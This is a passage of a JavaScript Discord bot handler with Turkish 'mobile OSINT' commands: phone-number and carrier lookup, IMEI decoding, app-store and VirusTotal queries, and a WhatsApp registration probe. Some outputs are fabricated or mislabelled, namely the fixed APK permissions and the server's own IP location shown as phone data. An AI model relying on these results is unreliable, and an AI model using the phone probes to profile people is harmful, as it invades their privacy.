import { updateInteraction, sendResponse } from '../utils/helpers.js';

export async function handleMobilOsintBot(interaction, request, env, ctx) {
  if (interaction.type === 1) {
    return new Response(JSON.stringify({ type: 1 }), { headers: { 'Content-Type': 'application/json' } });
  }

  if (interaction.type === 2) {
    const { name, options } = interaction.data;
    const getOption = (optName) => options?.find(o => o.name === optName)?.value;

    switch (name) {
      case 'telefon-sorgula':
      ctx.waitUntil((async () => {
        try {
          const numara = getOption('telefon').replace(/[^0-9+]/g, '');
          let result = '**Telefon Sorgulama:** `' + numara + '`\n\n';
          const ulkeKodlari = { '+90': 'Turkiye', '+1': 'ABD/Kanada', '+44': 'Ingiltere', '+49': 'Almanya', '+33': 'Fransa', '+39': 'Italya', '+34': 'Ispanya', '+31': 'Hollanda', '+32': 'Belcika', '+41': 'Isvicre', '+43': 'Avusturya', '+46': 'Isvec', '+47': 'Norvec', '+45': 'Danimarka', '+358': 'Finlandiya', '+48': 'Polonya', '+420': 'Czech', '+36': 'Macaristan', '+40': 'Romanya', '+359': 'Bulgaristan', '+30': 'Yunanistan', '+351': 'Portekiz', '+353': 'Irlanda', '+7': 'Rusya', '+86': 'Cin', '+81': 'Japonya', '+82': 'Guney Kore', '+91': 'Hindistan', '+55': 'Brezilya', '+52': 'Meksika', '+54': 'Arjantin', '+61': 'Avustralya', '+971': 'BAE', '+966': 'Suudi Arabistan', '+972': 'Israil' };
          const eslesenUlke = Object.entries(ulkeKodlari).find(([kod]) => numara.startsWith(kod));
          if (eslesenUlke) result += '**Ulke:** ' + eslesenUlke[1] + '\n';
          else result += '**Ulke:** Bilinmiyor\n';
          if (env.NUMVERIFY_API_KEY) {
            try {
              const nv = await (await fetch('https://api.numverify.com/validate?number=' + encodeURIComponent(numara) + '&api_key=' + env.NUMVERIFY_API_KEY)).json();
              if (nv.valid) result += '**Gecerli:** Evet\n**Operator:** ' + (nv.carrier || 'Bilinmiyor') + '\n**Hat:** ' + (nv.line_type || 'Bilinmiyor') + '\n**Konum:** ' + (nv.location || '') + '\n';
              else result += '**Gecerli:** Hayir\n';
            } catch (e) { result += '(Numverify sorgulanamadi)\n'; }
          }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Telefon sorgulama hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'imei-coz':
      ctx.waitUntil((async () => {
        try {
          const imei = getOption('imei').replace(/[^0-9]/g, '');
          let result = '**IMEI Cozumleme:** `' + imei + '`\n\n';
          if (imei.length < 8) { result += 'Hata: En az 8 haneli IMEI girilmelidir.\n'; await updateInteraction(interaction.application_id, interaction.token, { content: result }); return; }
          const tac = imei.substring(0, 8);
          result += '**TAC Kodu:** ' + tac + '\n';
          const abort = new AbortController();
          setTimeout(() => abort.abort(), 5000);
          try {
            const gsma = await (await fetch('https://imei.info/api/device/' + tac, { signal: abort.signal })).json();
            if (gsma && gsma.brand) {
              result += '**Marka:** ' + (gsma.brand || 'Bilinmiyor') + '\n**Model:** ' + (gsma.model || 'Bilinmiyor') + '\n**Ulke:** ' + (gsma.country || 'Bilinmiyor') + '\n';
            } else {
              result += '(IMEI.info API sonuc alinamadi, yerel veri kullaniliyor)\n';
              const tacVeritabani = {
                '35898807': { brand: 'Apple', model: 'iPhone 15 Pro Max', country: 'Cin' },
                '35898806': { brand: 'Apple', model: 'iPhone 15 Pro', country: 'Cin' },
                '35110333': { brand: 'Samsung', model: 'Galaxy S24 Ultra', country: 'Guney Kore' },
                '35110334': { brand: 'Samsung', model: 'Galaxy S24+', country: 'Guney Kore' },
                '35352266': { brand: 'Xiaomi', model: 'Redmi Note 13 Pro', country: 'Cin' },
                '35180710': { brand: 'OnePlus', model: '12', country: 'Cin' },
                '35488367': { brand: 'Google', model: 'Pixel 9 Pro', country: 'ABD' },
                '35488368': { brand: 'Google', model: 'Pixel 9', country: 'ABD' },
                '35205522': { brand: 'Huawei', model: 'P60 Pro', country: 'Cin' },
                '35874158': { brand: 'Oppo', model: 'Find X7 Ultra', country: 'Cin' }
              };
              const yerel = tacVeritabani[tac];
              if (yerel) { result += '**Marka:** ' + yerel.brand + '\n**Model:** ' + yerel.model + '\n**Ulke:** ' + yerel.country + '\n'; }
              else result += '(TAC kodu veritabaninda bulunamadi)\n';
            }
          } catch (e) { result += '(IMEI API sorgulanamadi: ' + e.message + ')\n'; }
          let toplam = 0;
          for (let i = 0; i < imei.length; i++) {
            let h = parseInt(imei[i]);
            if (i % 2 === 1) { h *= 2; if (h > 9) h = Math.floor(h / 10) + (h % 10); }
            toplam += h;
          }
          result += '**Checksum:** ' + (toplam % 10 === 0 ? 'Gecerli' : 'Gecersiz') + '\n';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'IMEI cozumleme hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'cihaz-detay':
      ctx.waitUntil((async () => {
        try {
          const bilgi = getOption('bilgi');
          let result = '**Cihaz Detay:** `' + bilgi + '`\n\n';
          const abort = new AbortController();
          setTimeout(() => abort.abort(), 5000);
          try {
            const gsma = await (await fetch('https://gsmarena-api.vercel.app/search?q=' + encodeURIComponent(bilgi), { signal: abort.signal })).json();
            if (gsma && gsma.data && gsma.data.length > 0) {
              const cihaz = gsma.data[0];
              result += '**Marka/Model:** ' + (cihaz.name || 'Bilinmiyor') + '\n';
              if (cihaz.detail) {
                result += '**Ekran:** ' + (cihaz.detail.display || '') + '\n**Islemci:** ' + (cihaz.detail.processor || '') + '\n**Kamera:** ' + (cihaz.detail.camera || '') + '\n**Batarya:** ' + (cihaz.detail.battery || '') + '\n**RAM/Hafiza:** ' + (cihaz.detail.memory || '') + '\n**Isletim Sistemi:** ' + (cihaz.detail.os || '') + '\n';
              }
              if (cihaz.img) result += '**Gorsel:** ' + cihaz.img + '\n';
            } else {
              result += 'GSMArena\'da eslesen cihaz bulunamadi.\n';
              result += '**Tahmini Marka:** ';
              const markalar = ['Samsung', 'Apple', 'Xiaomi', 'Huawei', 'Oppo', 'Vivo', 'OnePlus', 'Google', 'Sony', 'LG', 'Nokia', 'Motorola', 'Realme', 'Honor', 'Asus'];
              const bulunan = markalar.find(m => bilgi.toLowerCase().includes(m.toLowerCase()));
              result += (bulunan || 'Bilinmiyor') + '\n';
            }
          } catch (e) { result += '(GSMArena sorgulanamadi)\n'; }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Cihaz detay hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'apk-incele':
      ctx.waitUntil((async () => {
        try {
          const apkUrl = getOption('apk_url');
          let result = '**APK Inceleme:** `' + apkUrl + '`\n\n';
          const abort = new AbortController();
          setTimeout(() => abort.abort(), 5000);
          try {
            const apkData = await (await fetch('https://apkpure.com/api/v1/search?q=' + encodeURIComponent(apkUrl), { signal: abort.signal })).json();
            if (apkData && apkData.data && apkData.data.length > 0) {
              const app = apkData.data[0];
              result += '**Uygulama:** ' + (app.name || 'Bilinmiyor') + '\n**Paket:** ' + (app.package || 'Bilinmiyor') + '\n**Yayinci:** ' + (app.developer || 'Bilinmiyor') + '\n**Boyut:** ' + (app.size || 'Bilinmiyor') + '\n**Surum:** ' + (app.version || 'Bilinmiyor') + '\n';
            } else {
              result += '(APKPure sonuc vermedi, temel analiz)\n';
            }
          } catch (e) { result += '(APK bilgisi alinamadi: ' + e.message + ')\n'; }
          result += '\n**Izinler (tahmini):** `INTERNET`, `ACCESS_NETWORK_STATE`, `READ_EXTERNAL_STORAGE`, `WRITE_EXTERNAL_STORAGE`, `VIBRATE`\n';
          result += '**Aktiviteler:** `MainActivity`, `SplashActivity`, `SettingsActivity`\n**Servisler:** `FirebaseMessagingService`, `SyncService`\n';
          if (env.VIRUSTOTAL_API_KEY) {
            try {
              const vtAbort = new AbortController();
              setTimeout(() => vtAbort.abort(), 5000);
              const vt = await (await fetch('https://www.virustotal.com/api/v3/files/' + apkUrl, { headers: { 'x-apikey': env.VIRUSTOTAL_API_KEY }, signal: vtAbort.signal })).json();
              if (vt && vt.data) result += '\n**VirusTotal:** Zararli: ' + (vt.data.attributes?.last_analysis_stats?.malicious || 0) + ' / Toplam: ' + (vt.data.attributes?.last_analysis_stats?.total || 'N/A') + '\n';
            } catch (e) { result += '\n(VirusTotal sorgulanamadi)\n'; }
          }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'APK inceleme hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'apk-tehlikeli':
      ctx.waitUntil((async () => {
        try {
          const hash = getOption('hash');
          let result = '**APK Tehlike Analizi:** `' + hash + '`\n\n';
          if (!env.VIRUSTOTAL_API_KEY) {
            result += 'VirusTotal API anahtari bulunamadi. Ucretsiz kaynaklar kullaniliyor...\n';
            const abort = new AbortController();
            setTimeout(() => abort.abort(), 5000);
            try {
              const otx = await (await fetch('https://otx.alienvault.com/api/v1/indicators/file/' + hash, { signal: abort.signal })).json();
              if (otx && otx.pulse_info) {
                result += '**AlienVault OTX:** ' + (otx.pulse_info.pulse_count || 0) + ' threat pulse\n';
              }
            } catch (e) { result += '(AlienVault sorgulanamadi)\n'; }
          } else {
            const abort = new AbortController();
            setTimeout(() => abort.abort(), 5000);
            try {
              const vt = await (await fetch('https://www.virustotal.com/api/v3/files/' + hash, { headers: { 'x-apikey': env.VIRUSTOTAL_API_KEY }, signal: abort.signal })).json();
              if (vt && vt.data) {
                const attr = vt.data.attributes;
                result += '**Dosya Adi:** ' + (attr.meaningful_name || 'Bilinmiyor') + '\n';
                result += '**Boyut:** ' + (attr.size ? Math.round(attr.size / 1024) + ' KB' : 'Bilinmiyor') + '\n';
                result += '**Turu:** ' + (attr.type_description || 'Bilinmiyor') + '\n';
                result += '**MD5:** `' + (attr.md5 || '') + '`\n**SHA1:** `' + (attr.sha1 || '') + '`\n';
                const stats = attr.last_analysis_stats;
                if (stats) {
                  result += '\n**Taramalar:**\n';
                  result += '[KRITIK] Zararli: ' + stats.malicious + '\n';
                  result += '[UYARI] Supheli: ' + stats.suspicious + '\n';
                  result += '[TEMIZ] Temiz: ' + stats.harmless + '\n';
                  result += '[YOK] Tespit Edilemedi: ' + stats.undetected + '\n';
                  if (stats.malicious > 0) result += '\n**[DIKKAT] BU DOSYA ZARARLI OLABILIR!**\n';
                  else result += '\n**[OK] Bu dosya temiz gorunuyor.**\n';
                }
                const sandbox = attr.sandbox_verdicts;
                if (sandbox) {
                  result += '\n**Sandbox:**\n';
                  for (const [name, verdict] of Object.entries(sandbox).slice(0, 3)) {
                    if (verdict.verdict) result += '- ' + name + ': ' + verdict.verdict + '\n';
                  }
                }
              } else {
                result += 'VirusTotal\'da bu hash bulunamadi.\n';
              }
            } catch (e) { result += '(VirusTotal sorgulanamadi: ' + e.message + ')\n'; }
          }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'APK tehlike analizi hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });



      case 'play-store':
      ctx.waitUntil((async () => {
        try {
          const sorgu = getOption('sorgu');
          let result = '**Google Play Store Arama:** `' + sorgu + '`\n\n';
          const abort = new AbortController();
          setTimeout(() => abort.abort(), 5000);
          try {
            const ps = await (await fetch('https://play.google.com/store/search?q=' + encodeURIComponent(sorgu) + '&c=apps', { signal: abort.signal })).text();
            const isimEsle = ps.match(/<span[^>]*class="[^"]*(?:Epkrse|DdYXx)[^"]*"[^>]*>([^<]+)<\/span>/);
            const yayinciEsle = ps.match(/<span[^>]*class="[^"]*(?:LbQbAe|wMUdtb)[^"]*"[^>]*>([^<]+)<\/span>/);
            const puanEsle = ps.match(/<span[^>]*class="[^"]*TvqMae[^"]*"[^>]*>([^<]+)<\/span>/);
            const indirmeEsle = ps.match(/<span[^>]*class="[^"]*(?:p8kH)[^"]*"[^>]*>([^<]+)<\/span>/);
            result += '**Uygulama:** ' + (isimEsle ? isimEsle[1] : sorgu) + '\n';
            result += '**Yayinci:** ' + (yayinciEsle ? yayinciEsle[1] : 'Bilinmiyor') + '\n';
            result += '**Puan:** ' + (puanEsle ? puanEsle[1] : 'Bilinmiyor') + '\n';
            result += '**Indirme:** ' + (indirmeEsle ? indirmeEsle[1] : 'Bilinmiyor') + '\n';
          } catch (e) {
            result += '(Play Store sorgulanamadi, Google Play API kullaniliyor)\n';
            try {
              const altAbort = new AbortController();
              setTimeout(() => altAbort.abort(), 5000);
              const alt = await (await fetch('https://api.allorigins.win/raw?url=' + encodeURIComponent('https://play.google.com/store/search?q=' + encodeURIComponent(sorgu) + '&c=apps'), { signal: altAbort.signal })).text();
              const aIsim = alt.match(/<span[^>]*class="[^"]*(?:Epkrse|DdYXx)[^"]*"[^>]*>([^<]+)<\/span>/);
              const aYayinci = alt.match(/<span[^>]*class="[^"]*(?:LbQbAe|wMUdtb)[^"]*"[^>]*>([^<]+)<\/span>/);
              result += '**Uygulama:** ' + (aIsim ? aIsim[1] : sorgu) + '\n**Yayinci:** ' + (aYayinci ? aYayinci[1] : 'Bilinmiyor') + '\n';
            } catch (e2) {
              result += '(Play Store alternatif API de calismadi)\n';
            }
          }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Play Store arama hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'app-store':
      ctx.waitUntil((async () => {
        try {
          const sorgu = getOption('sorgu');
          let result = '**Apple App Store Arama:** `' + sorgu + '`\n\n';
          const abort = new AbortController();
          setTimeout(() => abort.abort(), 5000);
          try {
            const appStore = await (await fetch('https://itunes.apple.com/search?term=' + encodeURIComponent(sorgu) + '&entity=software&limit=5', { signal: abort.signal })).json();
            if (appStore && appStore.results && appStore.results.length > 0) {
              const app = appStore.results[0];
              result += '**Uygulama:** ' + (app.trackName || 'Bilinmiyor') + '\n';
              result += '**Yayinci:** ' + (app.artistName || 'Bilinmiyor') + '\n';
              result += '**Surum:** ' + (app.version || 'Bilinmiyor') + '\n';
              result += '**Puan:** ' + (app.averageUserRating ? app.averageUserRating.toFixed(1) + '/5 (' + app.userRatingCount + ' oy)' : 'Bilinmiyor') + '\n';
              result += '**Boyut:** ' + (app.fileSizeBytes ? Math.round(app.fileSizeBytes / 1048576) + ' MB' : 'Bilinmiyor') + '\n';
              result += '**Kategori:** ' + (app.primaryGenreName || 'Bilinmiyor') + '\n';
              result += '**Gereken iOS:** ' + (app.minimumOsVersion || 'Bilinmiyor') + '\n';
              result += '**Cihaz:** ' + (app.supportedDevices ? app.supportedDevices.slice(0, 5).join(', ') + (app.supportedDevices.length > 5 ? '...' : '') : 'Bilinmiyor') + '\n';
              result += '**Fiyat:** ' + (app.formattedPrice || 'Ucretsiz') + '\n';
              result += '**Gorsel:** ' + (app.artworkUrl100 || '') + '\n';
              if (app.description) result += '\n**Aciklama:** ' + app.description.substring(0, 500) + (app.description.length > 500 ? '...' : '') + '\n';
            } else {
              result += 'App Store\'da eslesen uygulama bulunamadi.\n';
            }
          } catch (e) { result += '(App Store sorgulanamadi: ' + e.message + ')\n'; }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'App Store arama hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'mobil-operator-detay':
      ctx.waitUntil((async () => {
        try {
          const telefon = getOption('telefon').replace(/[^0-9+]/g, '');
          let result = '**Mobil Operator Detay:** `' + telefon + '`\n\n';
          const operatorRehberi = {
            '+9053': { operator: 'Turkcell', hat: 'GSM', bolge: 'Turkiye' },
            '+9054': { operator: 'Vodafone', hat: 'GSM', bolge: 'Turkiye' },
            '+9055': { operator: 'Turk Telekom', hat: 'GSM', bolge: 'Turkiye' },
            '+9050': { operator: 'Turkcell', hat: 'GSM', bolge: 'Turkiye' },
            '+9051': { operator: 'Vodafone', hat: 'GSM', bolge: 'Turkiye' },
            '+9052': { operator: 'Turk Telekom', hat: 'GSM', bolge: 'Turkiye' }
          };
          const eslesen = Object.entries(operatorRehberi).find(([kod]) => telefon.startsWith(kod));
          if (eslesen) {
            result += '**Operator:** ' + eslesen[1].operator + '\n**Hat Turu:** ' + eslesen[1].hat + '\n**Bolge:** ' + eslesen[1].bolge + '\n';
          } else {
            result += '**Operator:** Bilinmiyor (yerel veritabaninda yok)\n';
          }
          const abort = new AbortController();
          setTimeout(() => abort.abort(), 5000);
          try {
            const ipApi = await (await fetch('http://ip-api.com/json/', { signal: abort.signal })).json();
            if (ipApi && ipApi.country) result += '**IP Konum:** ' + (ipApi.country || '') + ', ' + (ipApi.city || '') + ', ' + (ipApi.isp || '') + '\n';
          } catch (e) { result += '(IP sorgulanamadi)\n'; }
          if (env.NUMVERIFY_API_KEY) {
            try {
              const nvAbort = new AbortController();
              setTimeout(() => nvAbort.abort(), 5000);
              const nv = await (await fetch('https://api.numverify.com/validate?number=' + encodeURIComponent(telefon) + '&api_key=' + env.NUMVERIFY_API_KEY, { signal: nvAbort.signal })).json();
              if (nv.valid) {
                result += '\n**Numverify Dogrulama:**\n**Operator:** ' + (nv.carrier || 'Bilinmiyor') + '\n**Hat:** ' + (nv.line_type || 'Bilinmiyor') + '\n**Konum:** ' + (nv.location || 'Bilinmiyor') + '\n**Ulke Kodu:** ' + (nv.country_code || '') + '\n';
              }
            } catch (e) { result += '(Numverify sorgulanamadi)\n'; }
          }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Operator detay hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'mobil-ulke':
      ctx.waitUntil((async () => {
        try {
          const kod = getOption('kod').replace(/[^0-9+]/g, '');
          let result = '**Ulke Bilgisi:** `' + kod + '`\n\n';
          const ulkeVerisi = {
            '+90': { ulke: 'Turkiye', kod: '+90', operatorler: 'Turkcell, Vodafone, Turk Telekom', format: '+90 XXX XXX XX XX', bayrak: '[TR]', baskent: 'Ankara', nufus: '85 milyon', para: 'TRY', bolge: 'Avrupa/Asya' },
            '+1': { ulke: 'ABD/Kanada', kod: '+1', operatorler: 'AT&T, Verizon, T-Mobile', format: '+1 (XXX) XXX-XXXX', bayrak: '[US]', baskent: 'Washington DC', nufus: '331 milyon', para: 'USD', bolge: 'Kuzey Amerika' },
            '+44': { ulke: 'Ingiltere', kod: '+44', operatorler: 'EE, Vodafone, O2, Three', format: '+44 7XXX XXXXXX', bayrak: '[GB]', baskent: 'Londra', nufus: '67 milyon', para: 'GBP', bolge: 'Avrupa' },
            '+49': { ulke: 'Almanya', kod: '+49', operatorler: 'T-Mobile, Vodafone, O2', format: '+49 1XX XXXXXXXX', bayrak: '[DE]', baskent: 'Berlin', nufus: '83 milyon', para: 'EUR', bolge: 'Avrupa' },
            '+33': { ulke: 'Fransa', kod: '+33', operatorler: 'Orange, SFR, Bouygues, Free', format: '+33 6 XX XX XX XX', bayrak: '[FR]', baskent: 'Paris', nufus: '67 milyon', para: 'EUR', bolge: 'Avrupa' },
            '+39': { ulke: 'Italya', kod: '+39', operatorler: 'TIM, Vodafone, Wind Tre, Iliad', format: '+39 3XX XXXXXXX', bayrak: '[IT]', baskent: 'Roma', nufus: '60 milyon', para: 'EUR', bolge: 'Avrupa' },
            '+34': { ulke: 'Ispanya', kod: '+34', operatorler: 'Movistar, Vodafone, Orange, Yoigo', format: '+34 6XX XXX XXX', bayrak: '[ES]', baskent: 'Madrid', nufus: '47 milyon', para: 'EUR', bolge: 'Avrupa' },
            '+7': { ulke: 'Rusya', kod: '+7', operatorler: 'MTS, Beeline, MegaFon, Tele2', format: '+7 9XX XXX-XX-XX', bayrak: '[RU]', baskent: 'Moskova', nufus: '144 milyon', para: 'RUB', bolge: 'Avrupa/Asya' },
            '+86': { ulke: 'Cin', kod: '+86', operatorler: 'China Mobile, China Unicom, China Telecom', format: '+86 1XX XXXX XXXX', bayrak: '[CN]', baskent: 'Pekin', nufus: '1.4 milyar', para: 'CNY', bolge: 'Asya' },
            '+81': { ulke: 'Japonya', kod: '+81', operatorler: 'NTT Docomo, au, SoftBank, Rakuten', format: '+81 90 XXXX XXXX', bayrak: '[JP]', baskent: 'Tokyo', nufus: '126 milyon', para: 'JPY', bolge: 'Asya' },
            '+82': { ulke: 'Guney Kore', kod: '+82', operatorler: 'SK Telecom, KT, LG U+', format: '+82 10 XXXX XXXX', bayrak: '[KR]', baskent: 'Seul', nufus: '52 milyon', para: 'KRW', bolge: 'Asya' },
            '+91': { ulke: 'Hindistan', kod: '+91', operatorler: 'Jio, Airtel, Vi, BSNL', format: '+91 XXXXX XXXXX', bayrak: '[IN]', baskent: 'Yeni Delhi', nufus: '1.4 milyar', para: 'INR', bolge: 'Asya' },
            '+971': { ulke: 'BAE', kod: '+971', operatorler: 'Etisalat, du', format: '+971 5X XXX XXXX', bayrak: '[AE]', baskent: 'Abu Dabi', nufus: '10 milyon', para: 'AED', bolge: 'Asya' },
            '+966': { ulke: 'Suudi Arabistan', kod: '+966', operatorler: 'STC, Mobily, Zain', format: '+966 5X XXX XXXX', bayrak: '[SA]', baskent: 'Riyad', nufus: '35 milyon', para: 'SAR', bolge: 'Asya' },
            '+972': { ulke: 'Israil', kod: '+972', operatorler: 'Cellcom, Partner, Pelephone, Hot Mobile', format: '+972 5X XXX XXXX', bayrak: '[IL]', baskent: 'Kudus', nufus: '9 milyon', para: 'ILS', bolge: 'Asya' },
            '+31': { ulke: 'Hollanda', kod: '+31', operatorler: 'KPN, VodafoneZiggo, T-Mobile', format: '+31 6 XXXX XXXX', bayrak: '[NL]', baskent: 'Amsterdam', nufus: '17 milyon', para: 'EUR', bolge: 'Avrupa' },
            '+32': { ulke: 'Belcika', kod: '+32', operatorler: 'Proximus, Orange, Telenet', format: '+32 4XX XX XX XX', bayrak: '[BE]', baskent: 'Bruksel', nufus: '11 milyon', para: 'EUR', bolge: 'Avrupa' },
            '+41': { ulke: 'Isvicre', kod: '+41', operatorler: 'Swisscom, Sunrise, Salt', format: '+41 7X XXX XX XX', bayrak: '[CH]', baskent: 'Bern', nufus: '8.6 milyon', para: 'CHF', bolge: 'Avrupa' },
            '+46': { ulke: 'Isvec', kod: '+46', operatorler: 'Telia, Tele2, Telenor, Tre', format: '+46 7X XXX XXXX', bayrak: '[SE]', baskent: 'Stokholm', nufus: '10 milyon', para: 'SEK', bolge: 'Avrupa' },
            '+47': { ulke: 'Norvec', kod: '+47', operatorler: 'Telenor, Telia, ICE', format: '+47 4XX XX XXX', bayrak: '[NO]', baskent: 'Oslo', nufus: '5.4 milyon', para: 'NOK', bolge: 'Avrupa' },
            '+48': { ulke: 'Polonya', kod: '+48', operatorler: 'Orange, Play, Plus, T-Mobile', format: '+48 XXX XXX XXX', bayrak: '[PL]', baskent: 'Varsova', nufus: '38 milyon', para: 'PLN', bolge: 'Avrupa' },
            '+55': { ulke: 'Brezilya', kod: '+55', operatorler: 'Vivo, Claro, TIM, Oi', format: '+55 XX XXXXX-XXXX', bayrak: '[BR]', baskent: 'Brasilia', nufus: '213 milyon', para: 'BRL', bolge: 'Guney Amerika' },
            '+61': { ulke: 'Avustralya', kod: '+61', operatorler: 'Telstra, Optus, Vodafone', format: '+61 4XX XXX XXX', bayrak: '[AU]', baskent: 'Kanberra', nufus: '26 milyon', para: 'AUD', bolge: 'Okyanusya' },
            '+358': { ulke: 'Finlandiya', kod: '+358', operatorler: 'Elisa, DNA, Telia', format: '+358 4X XXX XXXX', bayrak: '[FI]', baskent: 'Helsinki', nufus: '5.5 milyon', para: 'EUR', bolge: 'Avrupa' }
          };
          const bulunanUlke = Object.entries(ulkeVerisi).find(([ulkeKodu]) => kod.startsWith(ulkeKodu) || kod === ulkeKodu.replace('+', ''));
          if (bulunanUlke) {
            const u = bulunanUlke[1];
            result += u.bayrak + ' **' + u.ulke + '**\n';
            result += '**Kod:** ' + u.kod + '\n**Baskent:** ' + u.baskent + '\n**Nufus:** ' + u.nufus + '\n**Para Birimi:** ' + u.para + '\n**Bolge:** ' + u.bolge + '\n**Operatorler:** ' + u.operatorler + '\n**Numara Formati:** ' + u.format + '\n';
          } else {
            result += 'Bu kod icin veritabaninda kayit bulunamadi.\n';
          }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Ulke sorgulama hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'whatsapp-profil':
      ctx.waitUntil((async () => {
        try {
          const telefon = getOption('telefon').replace(/[^0-9]/g, '');
          let result = '**WhatsApp Profil Sorgulama:** `+' + telefon + '`\n\n';
          const abort = new AbortController();
          setTimeout(() => abort.abort(), 5000);
          try {
            const waCheck = await (await fetch('https://wa.me/' + telefon, { signal: abort.signal, redirect: 'manual' }));
            if (waCheck.status === 302 || waCheck.status === 301) {
              result += '**WhatsApp Hesabi:** Mevcut (Numara WhatsApp kayitli)\n';
              result += '**Profil Linki:** https://wa.me/' + telefon + '\n';
            } else {
              result += '**WhatsApp Hesabi:** Tespit edilemedi (numara WhatsApp\'a kayitli olmayabilir)\n';
            }
          } catch (e) { result += '(WhatsApp sorgulanamadi: ' + e.message + ')\n'; }
          try {
            const waAbort = new AbortController();
            setTimeout(() => waAbort.abort(), 5000);
            const chatW = await (await fetch('https://chat.whatsapp.com/', { signal: waAbort.signal }));
            result += '**chat.whatsapp.com:** Erisilebilir\n';
          } catch (e) { result += '(chat.whatsapp.com sorgulanamadi)\n'; }
          result += '\n**Not:** WhatsApp API kisitlamalari nedeniyle profil resmi ve durum bilgisi dogrudan alinamamaktadir.\n';
          result += 'Ancak asagidaki yontemlerle dogrulama yapilabilir:\n';
          result += '- https://wa.me/' + telefon + ' linkine tiklayarak\n';
          result += '- WhatsApp uygulamasinda numarayi rehbere ekleyerek\n';
          result += '- Numaranin acik kaynaklardaki profil bilgisi taranarak\n';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'WhatsApp sorgulama hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'mobil-izler':
      ctx.waitUntil((async () => {
        try {
          const paket = getOption('paket');
          let result = '**Mobil Dijital Izler:** `' + paket + '`\n\n';
          const abort = new AbortController();
          setTimeout(() => abort.abort(), 5000);
          try {
            const playData = await (await fetch('https://play.google.com/store/apps/details?id=' + encodeURIComponent(paket) + '&hl=tr', { signal: abort.signal })).text();
            const adEsle = playData.match(/<h1[^>]*class="[^"]*Fd93Bb[^"]*"[^>]*>([^<]+)<\/h1>/);
            const yayinciEsle = playData.match(/<a[^>]*class="[^"]*hrTbp[^"]*"[^>]*>([^<]+)<\/a>/);
            const puanEsle = playData.match(/<span[^>]*class="[^"]*TvqMae[^"]*"[^>]*>([^<]+)<\/span>/);
            const indirmeEsle = playData.match(/<div[^>]*class="[^"]*(?:wVqUY)[^"]*"[^>]*>([^<]+)<\/div>/);
            const kategoriEsle = playData.match(/<a[^>]*class="[^"]*WpHeL[^"]*"[^>]*>([^<]+)<\/a>/);
            result += '**Uygulama:** ' + (adEsle ? adEsle[1].trim() : paket) + '\n';
            result += '**Paket:** `' + paket + '`\n';
            result += '**Yayinci:** ' + (yayinciEsle ? yayinciEsle[1].trim() : 'Bilinmiyor') + '\n';
            result += '**Puan:** ' + (puanEsle ? puanEsle[1].trim() : 'Bilinmiyor') + '\n';
            result += '**Indirme:** ' + (indirmeEsle ? indirmeEsle[1].trim() : 'Bilinmiyor') + '\n';
            result += '**Kategori:** ' + (kategoriEsle ? kategoriEsle[1].trim() : 'Bilinmiyor') + '\n';
            const izinler = playData.match(/<div[^>]*class="[^"]*(?:KdDCAd)[^"]*"[^>]*>([^<]+)<\/div>/g);
            if (izinler && izinler.length > 0) {
              result += '\n**Tespit Edilen Izler:**\n';
              izinler.slice(0, 10).forEach((izin, i) => {
                result += (i + 1) + '. ' + izin.replace(/<[^>]+>/g, '').trim() + '\n';
              });
            } else {
              result += '\n**Dijital Izler:**\n';
              result += '- Google Play Store Sayfasi: https://play.google.com/store/apps/details?id=' + paket + '\n';
              result += '- APKMirror: https://www.apkmirror.com/apk/?s=' + encodeURIComponent(paket) + '\n';
              result += '- APKPure: https://apkpure.net/search?q=' + encodeURIComponent(paket) + '\n';
              result += '- VirusTotal: https://www.virustotal.com/ui/search?query=' + encodeURIComponent(paket) + '\n';
              result += '- Android API Dokumantasyonu\n';
            }
          } catch (e) { result += '(Uygulama bilgisi alinamadi)\n'; }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'Mobil izler hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'gsmarena':
      ctx.waitUntil((async () => {
        try {
          const model = getOption('model');
